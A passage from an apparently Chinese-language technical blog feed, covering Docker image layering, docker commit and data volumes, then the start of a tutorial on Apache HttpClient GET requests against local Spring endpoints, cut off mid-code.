data-lazy-src="https://unpkg.com/nan-picture/blog/20210614232723.png"></p><p>这种情況下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新</p><p>镜像层添加到镜像当中。</p><hr><p>Docker通过存储引擎（新版本采用<strong>快照机制</strong>）的方式来实现镜像层堆栈，并保证多镜像层对外展示为统一的文件系统。Linux上可用的存储引撃有AUFS、 Overlay2、 Device Mapper、Btrfs以及ZFS。顾名思义，每种存储引擎都基于 Linux中对应的文件系统或者设备技术，并且每种存储引擎都有其独有的性能特点。</p><p>Docker在 Windows上仅支持 windowsfilter 一种存储引擎，该引擎基于NTFS文件系统之上实现了分层和CoW。</p><p>下图展示了与系统显示相同的三层镜像。所有镜像层堆并合并，对外提供统一的视图：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210614232815.png"></p><hr><h2 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h2><p>docker commit 提交容器使之成为一个新的镜像。</p><p><code>docker commit -m=&quot;描述信息&quot; -a=&quot;作者&quot; 容器id 目标镜像名:[TAG]</code></p><p><strong>案例演示：</strong></p><ol><li><p>从Hub上下载tomcat镜像到本地并成功运行<code>docker run -d -p 8080:8080 tomcat </code></p></li><li><p>发现这个默认的tomcat是没有webapps应用，官方的镜像默认webapps下面是没有文件的！ <code>docker exec -it 容器id /bin/bash</code></p></li><li><p>拷贝文件进去webapps文件夹内<code>docker cp /root/text.html 容器id: webapps的路径</code></p></li><li><p>将操作过的容器通过commit提交为一个新的镜像。我们以后就使用我们修改过的镜像即可。 <code>docker commit -a=&quot;阿楠&quot; -m=&quot;add webapps app&quot; 容器id nanzx/tomcat</code></p></li><li><p>通过<code>docker images</code>可以看到我们新提交的镜像。</p></li></ol><p>如果你想要保存当前容器的状态，就可以通过commit来提交获得一个镜像，就好比我们我们使用虚拟机的快照。</p><hr><h1 id="Docker容器数据卷"><a href="#Docker容器数据卷" class="headerlink" title="Docker容器数据卷"></a>Docker容器数据卷</h1><p>Docker容器产生的数据，如果不通过docker commit生成新的镜像使数据做为镜像的一部分保存下来，那么当容器删除后，数据自然也就没有了。为了能保存数据在docker中我们使用<strong>数据卷</strong>（类似redis里面的rdb和aof文件）。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>卷就是目录或文件，存在于一个或多个容器中，由docker挂载到容器，但不属于联合文件系统，因此能够绕过Union File System提供一些用于<strong>持续存储或共享数据</strong>的特性；</p><p>卷的设计目的就是数据的持久化，完全独立于容器的生存周期，因此<strong>Docker不会在容器删除时删除其挂载的数据卷。</strong></p><p>特点：</p><ol><li>数据卷可在容器之间共享或重用数据</li><li>数据卷中的更改可以直接生效</li><li>数据卷中的更改不会包含在镜像的更新中</li><li>数据卷的生命周期一直持续到没有容器使用它为止</li></ol><blockquote><p><strong>容器内挂载的文件和宿主机的文件同步修改，即使容器停止了，宿主机修改文件，也依旧同步。</strong></p></blockquote><hr><h2 id="使用数据卷"><a href="#使用数据卷" class="headerlink" title="使用数据卷"></a>使用数据卷</h2><p><strong>使用命令挂载(- v)：</strong></p><ul><li>匿名挂载</li><li><code>docker run -d -P --name nginx1 -v /etc/nginx(容器内路径) nginx </code></li><li>具名挂载<ul><li><code>docker run -d -P --name nginx1 -v myVolume(自定义卷名):/etc/nginx(容器内路径) nginx </code></li></ul></li><li>指定路径挂载<ul><li><code>docker run -d -P --name nginx1 -v /root/mynginx(宿主机路径):/etc/nginx(容器内路径) nginx</code></li></ul></li></ul><p><strong>注意：</strong>自定义卷名可以通过<code>docker volume create 卷名</code>创建。</p><hr><p><strong>DockerFile添加：</strong></p><ol><li><p>根目录下新建mydocker文件夹并进入</p></li><li><p>可在Dockerfile中使用 VOLUME指令 来给镜像添加一个或多个数据卷。<code>VOLUME[&quot;/dataVolumeContainer1&quot;,&quot;/dataVolumeContainer2&quot;,&quot;/dataVolumeContainer3&quot;]</code></p><p>说明：出于可移植和分享的考虑，用 <code>-v 主机目录：容器目录</code>这种方法不能够直接在Dockerfile中实现。因为宿主机目录是依赖于特定宿主机的，并不能够保证在所有的宿主机上都存在这样的特定目录。</p></li><li><p>File构建：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost mydocker]<span class="comment">#cat dockerfile1</span></span><br><span class="line"><span class="comment"># volume test</span></span><br><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">VOLUME</span><span class="language-bash"> [<span class="string">&quot;/dataVolumeContainer1&quot;</span>,<span class="string">&quot;/dataVolumeContainer2&quot;</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;finished,--------success1&quot;</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /bin/bash</span></span><br></pre></td></tr></table></figure></li><li><p>build生成镜像：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost mydocker]#docker build -f /mydocker/dockerfile1 -t nanzx/centos</span><br></pre></td></tr></table></figure><p><code>docker images</code>可以看到我们生成的镜像，-f是指定Dockerfile文件，-t是指定镜像标签</p></li><li><p>启动容器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost mydocker]#docker run -it nanzx/centos /bin/bash</span><br></pre></td></tr></table></figure><p>在根目录下 <code>ls</code>可以看到我们添加的数据卷，通过<code>docker inspect 容器id/容器名</code>可以发现对应的主机目录地址在&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;xxxx&#x2F;_data 下。</p></li></ol><hr><p><strong>查看是否挂载成功：</strong></p><ul><li><p>匿名挂载方式：<code>docker volume ls </code></p></li><li><p>具名挂载方式：<code>docker volume ls</code>、<code>docker volume inspect myVolume(自定义的卷名) </code></p></li><li><p>指定路径挂载方式：<code>docker inspect 容器id/容器名</code></p></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;Mounts&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bind&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/root/ql/db&quot;</span><span class="punctuation">,</span>   #主机内地址</span><br><span class="line">                <span class="attr">&quot;Destination&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/ql/db&quot;</span><span class="punctuation">,</span>   #docker容器内地址</span><br><span class="line">                <span class="attr">&quot;Mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;RW&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Propagation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rprivate&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><blockquote><p>所有的docker容器内的卷，没有指定目录的情况下都是在 &#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;xxxx&#x2F;_data 下。</p><p>如果指定了目录，docker volume ls 是查看不到的。</p></blockquote><p><strong>拓展：</strong></p><ul><li><p>ro（readonly：只读 ） 和 rw（readwrite：可读可写 ） ，用来改变数据卷的读写权限 </p><ul><li><code>docker run -d -P --name nginx1 -v myVolume:/etc/nginx:ro nginx </code></li><li><code>docker run -d -P --name nginx1 -v myVolume:/etc/nginx:rw nginx</code></li><li>只要看到ro就说明这个路径只能通过宿主机来操作，容器内部是无法操作！</li></ul></li><li><p>Docker挂载主机目录后，Docker访问出现cannot open directory: Permission denied</p><ul><li>解决办法：在挂载目录后多加一个<code>--privileged=true</code>参数即可</li></ul></li></ul><hr><h2 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h2><p>命名的容器挂载数据卷，其它容器通过挂载这个(父容器)实现数据共享，挂载数据卷的容器，称之为<strong>数据卷容器</strong>。</p><p><strong>容器间传递共享（–volumes-from）：</strong></p><ol><li><p>以前面新建的镜像 nanzx&#x2F;centos 为模板运行容器 dc01 ，它现在具有数据卷：</p><ul><li>&#x2F;dataVolumeContainer1，&#x2F;dataVolumeContainer2</li></ul></li><li><p>在父容器（dc01）的数据卷dataVolumeContainer2里新增文件</p></li><li><p>新增 dc02、dc03容器，继承自 dc01</p><ul><li><code>docker run -it --name dc02 --volumes-from dc01 nanzx/centos</code></li><li><code>docker run -it --name dc03 --volumes-from dc01 nanzx/centos</code></li></ul></li><li><p>可以在dc02、dc03容器的dataVolumeContainer2目录下看到操作2新增的文件，在容器dc02、dc03的数据卷里各自新增文件，三个容器都可查看到所有新增的文件。</p></li><li><p>通过<code>docker rm -f dc01</code>删除容器后，dc02、dc03的数据卷还是能正常访问和使用。</p></li></ol><blockquote><p>结论：容器之间配置信息的传递，数据卷的生命周期一直持续到没有容器使用它为止。</p><p>​     但是一旦你持久化到了本地，这个时候，本地的数据是不会删除的！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HttpClient的使用</title>
      <link href="/posts/983b/"/>
      <url>/posts/983b/</url>
      
        <content type="html"><![CDATA[<p><a href="http://hc.apache.org/">HttpClient官网</a></p><p>本文参考地址：<a href="https://blog.csdn.net/justry_deng/article/details/81042379">【CSDN】HttpClient详细使用示例  justry_deng</a></p><p>HttpClient主要用于访问其他接口</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p><strong>引入相关依赖：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.httpcomponents/httpclient --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.httpcomponents<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>httpclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.5.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.76<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>fastjson有将对象转化为json字符串的功能等。</p><p>这里使用的是4.5版本的httpclient，各个版本在使用上会有差异。</p></blockquote><hr><p><strong>用于以下案例的测试：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/doGet1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doGet1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;这个Get请求没有任何参数&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/doGet2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doGet2</span><span class="params">(String name, Integer age)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name + <span class="string">&quot;今年&quot;</span> + age + <span class="string">&quot;岁了&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/doPost1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doPost1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;这个Post请求没有任何参数&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/doPost2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doPost2</span><span class="params">(String name, Integer age)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name + <span class="string">&quot;今年&quot;</span> + age + <span class="string">&quot;岁了&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/doPost3&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doPost3</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> user.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/doPost4&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doPost4</span><span class="params">(<span class="meta">@RequestBody</span> User user, Integer flag, String meaning)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> user.toString() + <span class="string">&quot;\n&quot;</span> + flag + <span class="string">&quot;&gt;&gt;&gt;&quot;</span> + meaning;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="GET方式"><a href="#GET方式" class="headerlink" title="GET方式"></a>GET方式</h1><h2 id="无参"><a href="#无参" class="headerlink" title="无参"></a>无参</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doGet1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 获得Http客户端</span></span><br><span class="line">        <span class="type">CloseableHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClientBuilder.create().build();</span><br><span class="line">        <span class="comment">// 创建Get请求</span></span><br><span class="line">        <span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(<span class="string">&quot;http://localhost:8080/doGet1&quot;</span>);</span><br><span class="line">        <span class="comment">// 响应模型</span></span><br><span class="line">        <span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 由客户端执行(发送)Get请求</span></span><br><span class="line">            response = httpClient.execute(httpGet);</span><br><span class="line">            System.out.println(<span class="string">&quot;响应状态为:&quot;</span> + response.getStatusLine());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 从响应模型中获取响应实体</span></span><br><span class="line">            <span class="type">HttpEntity</span> <span class="variable">responseEntity</span> <span class="operator">=</span> response.getEntity();</span><br><span class="line">            <span class="keyword">if</span> (responseEntity != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;响应内容长度为:&quot;</span> + responseEntity.getContentLength());</span><br><span class="line">                System.out.println(<span class="string">&quot;响应内容为:&quot;</span> + EntityUtils.toString(responseEntity));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//释放实体资源</span></span><br><span class="line">            EntityUtils.consume(responseEntity);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 释放资源</span></span><br><span class="line">                <span class="keyword">if</span> (httpClient != <span class="literal">null</span>) &#123;</span><br><span class="line">                    httpClient.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (response != <span class="literal">null</span>) &#123;</span><br><span class="line">                    response.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="有参方式一"><a href="#有参方式一" class="headerlink" title="有参方式一"></a>有参方式一</h2><ul><li><strong>手动在url后面加上参数</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doGet2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 获得Http客户端</span></span><br><span class="line">        <span class="type">CloseableHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClientBuilder.create().build();</span><br><span class="line">        <span class="comment">// 参数</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">params</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 字符数据最好encoding以下;这样一来，某些特殊字符才能传过去(如:某人的名字就是“&amp;”,不encoding的话,传不过去)</span></span><br><span class="line">            params.append(<span class="string">&quot;name=&quot;</span>)</span><br><span class="line">                    .append(URLEncoder.encode(<span class="string">&quot;阿楠&quot;</span>, <span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    .append(<span class="string">&quot;&amp;&quot;</span>)</span><br><span class="line">                    .append(<span class="string">&quot;age=24&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建Get请求</span></span><br><span class="line">        <span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(<span class="string">&quot;http://localhost:8080/doGet2&quot;</span> + <span class="string">&quot;?&quot;</span> + params);</span><br><span class="line">        <span class="comment">// 响应模型</span></span><br><span class="line">        <span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 配置信息</span></span><br><span class="line">            <span class="type">RequestConfig</span> <span class="variable">requestConfig</span> <span class="operator">=</span> RequestConfig.custom()</span><br><span class="line">                    <span class="comment">// 设置连接超时时间(单位毫秒)</span></span><br><span class="line">                    .setConnectTimeout(<span class="number">5000</span>)</span><br><span class="line">                    <span class="comment">// 设置请求超时时间(单位毫秒)</span></span><br><span class="line">                    .setConnectionRequestTimeout(<span class="number">5000</span>)</span><br><span class="line">                    <span class="comment">// socket读写超时时间(单位毫秒)</span></span><br><span class="line">                    .setSocketTimeout(<span class="number">5000</span>)</span><br><span class="line">                    <span class="comment">// 设置是否允许重定向(默认为true)</span></span><br><span class="line">                    .setRedirectsEnabled(<span class="literal">true</span>).build();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将上面的配置信息 运用到这个Get请求里</span></span><br><span class="line">            httpGet.setConfig(requestConfig);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 由客户端执行(发送)Get请求</span></span><br><span class="line">            response = httpClient.execute(httpGet);</span><br><span class="line">            System.out.println(<span class="string">&quot;响应状态为:&quot;</span> + response.getStatusLine());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 从响应模型中获取响应实体</span></span><br><span class="line">            <span class="type">HttpEntity</span> <span class="variable">responseEntity</span> <span class="operator">=</span> response.getEntity();</span><br><span class="line">            <span class="keyword">if</span> (responseEntity != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;响应内容长度为:&quot;</span> + responseEntity.getContentLength());</span><br><span class="line">                System.out.println(<span class="string">&quot;响应内容为:&quot;</span> + EntityUtils.toString(responseEntity));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//释放实体资源</span></span><br><span class="line">            EntityUtils.consume(responseEntity);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 释放资源</span></span><br><span class="line">                <span class="keyword">if</span> (httpClient != <span class="literal">null</span>) &#123;</span><br><span class="line">                    httpClient.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (response != <span class="literal">null</span>) &#123;</span><br><span class="line">                    response.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="有参方式二"><a href="#有参方式二" class="headerlink" title="有参方式二"></a>有参方式二</h2><ul><li><strong>将参数放入键值对类中，再放入URI中，从而通过URI得到HttpGet实例</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doGet3</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 获得Http客户端</span></span><br><span class="line">        <span class="type">CloseableHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClientBuilder.create().build();</span><br><span class="line">        <span class="comment">// 参数</span></span><br><span class="line">        <span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 将参数放入键值对类NameValuePair中,再放入集合中</span></span><br><span class="line">            List&lt;NameValuePair&gt; params = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            params.add(<span class="keyword">new</span> <span class="title class_">BasicNameValuePair</span>(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;阿楠&quot;</span>));</span><br><span class="line">            params.add(<span class="keyword">new</span> <span class="title class_">BasicNameValuePair</span>(<span class="string">&quot;age&quot;</span>, <span class="string">&quot;18&quot;</span>));</span><br><span class="line">            <span class="comment">// 设置uri信息,并将参数集合放入uri;</span></span><br><span class="line">            <span class="comment">// 注:这里也支持一个键值对一个键值对地往里面放setParameter(String key, String value)</span></span><br><span class="line">            uri = <span class="keyword">new</span> <span class="title class_">URIBuilder</span>().setScheme(<span class="string">&quot;http&quot;</span>).setHost(<span class="string">&quot;localhost&quot;</span>)</span><br><span class="line">                    .setPort(<span class="number">8080</span>).setPath(<span class="string">&quot;/doGet2&quot;</span>)</span><br><span class="line">                    .setParameters(params).build();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 创建Get请求</span></span><br><span class="line">        <span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(uri);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 响应模型</span></span><br><span class="line">        <span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 配置信息</span></span><br><span class="line">            <span class="type">RequestConfig</span> <span class="variable">requestConfig</span> <span class="operator">=</span> RequestConfig.custom()</span><br><span class="line">                    <span class="comment">// 设置连接超时时间(单位毫秒)</span></span><br><span class="line">                    .setConnectTimeout(<span class="number">5000</span>)</span><br><span class="line">                    <span class="comment">// 